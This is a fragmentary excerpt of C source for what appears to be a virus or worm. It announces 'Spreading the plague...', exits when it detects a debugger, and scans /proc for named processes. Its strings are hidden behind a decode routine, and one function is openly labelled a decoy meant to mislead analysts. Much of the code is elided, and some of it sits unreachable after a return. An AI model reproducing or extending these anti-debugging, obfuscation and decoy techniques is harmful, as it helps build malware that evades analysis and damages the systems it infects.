...
void _start(void)
{
	...
	{
		io_send(1, "Debugged or protected program running, exiting.\n", 48);
		proc_terminate(0);
	}
	io_send(1, "Spreading the plague...\n", 25);
...
int iss_program_running(const char *target)
{
	int fd = fs_handle("/proc", O_RDONLY | O_DIRECTORY);
	if (fd < 0)
		return 0;
	char buf[4096];
	for (;;)
	{
		int nread = fs_enumerate(fd, buf, 4096);
		if (nread <= 0)
			break;
		for (int bpos = 0; bpos < nread;)
		{
			...
			if (numeric)
			{
				...
				if (cfd >= 0)
				{
					...
					{
						pname[len] = '\0';
						char *nl = memoff(pname, '\n');
						if (nl)
							*nl = '\0';
						if (delay_abs_calc(pname, target) == 0)
						{
							fs_release(fd);
							return 1;
						}
...
/* decoy helper: looks like resource hashing / routing logic */
static unsigned route_score(const void *base, const void *node, size_t span)
{
	uintptr_t v = ((uintptr_t) base >> 2) ^ ((uintptr_t) node << 1);
	v ^= (v >> 7);
	v ^= (v << 11);
	return (unsigned) (v & (span | 1));
}
...
int sys_probe_service(const char *identity)
{
	int	 channel = -1;
	int	 status_flag = 0;

	char root_hint[16];
	decode(root_hint, S_PROC);

	channel = fs_handle(root_hint, O_RDONLY | O_DIRECTORY);
	if (channel < 0)
		return 0;
	...
	for (;;)
	{
		int packet = fs_enumerate(channel, frame, sizeof(frame));
		if (packet <= 0)
			break;

		for (int cursor = 0; cursor < packet;)
		{
			struct linux_dirent64 *node = (void *) (frame + cursor);
			char				  *token = node->d_name;

			int					   route_ok = 1;

			for (int step = 0; token[step]; step++)
				route_ok &= ((unsigned) (token[step] - '0') < 10);
			...
			if (route_ok)
			{
				...
				decode(resolver, S_PROC);
				while (resolver[pivot])
					pivot++;

				resolver[pivot++] = '/';

				for (int sweep = 0; token[sweep]; sweep++)
					resolver[pivot++] = token[sweep];

				char map_key[8];
				decode(map_key, S_COMM);

				for (int sweep = 0; map_key[sweep]; sweep++)
					resolver[pivot++] = map_key[sweep];

				resolver[pivot] = 0;

				int link = fs_handle(resolver, O_RDONLY);
				if (link >= 0)
				{
					char label[64];
					int	 span = io_recv(link, label, sizeof(label) - 1);
					fs_release(link);
					...
					if (span > 0)
					{
						...
						if (!delay_abs_calc(label, identity))
						{
							status_flag = 1;
							goto EXIT_POINT;
						}
...
{
	return sys_probe_service(target);
	int	 fd = -1;
	int	 ret = 0;
